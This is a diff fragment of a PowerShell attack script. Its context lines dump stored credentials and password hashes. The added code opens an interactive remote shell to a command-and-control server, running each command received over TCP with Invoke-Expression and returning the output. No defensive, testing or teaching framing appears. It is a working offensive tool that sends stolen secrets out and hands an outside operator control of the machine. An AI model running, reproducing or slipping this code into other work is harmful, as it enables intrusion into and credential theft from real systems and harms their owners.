@@ -69,6 +69,36 @@ CheckStoredCredentials
 WriteToStream "Password Hashes:`n"
 DumpPasswordHashes
 
+function WriteShell ($String) {
+    # Create buffer to be used for next network stream read. Size is determined by the TCP client recieve buffer (65536 by default)
+    [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0}
+
+    # Write to C2
+    $writer.Write($String + 'SHELL> ')
+    $writer.Flush()
+}
+
+# Initial output to C2. The function also creates the inital empty byte array buffer used below.
+WriteShell ''
+
+# Loop that breaks if stream.Read throws an exception - will happen if connection is closed.
+while(($BytesRead = $stream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
+    # Encode command, remove last byte/newline
+    $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)
+    
+    # Execute command and save output (including errors thrown)
+    $Output = try {
+            Invoke-Expression $Command 2>&1 | Out-String
+        } catch {
+            $_ | Out-String
+        }
+
+    # Write output to C2
+    WriteShell ($Output)
+}
+# Closes the writer and the underlying TCPClient
+$writer.Close()
+
 # Initial output to the server
 WriteToStream ""
 
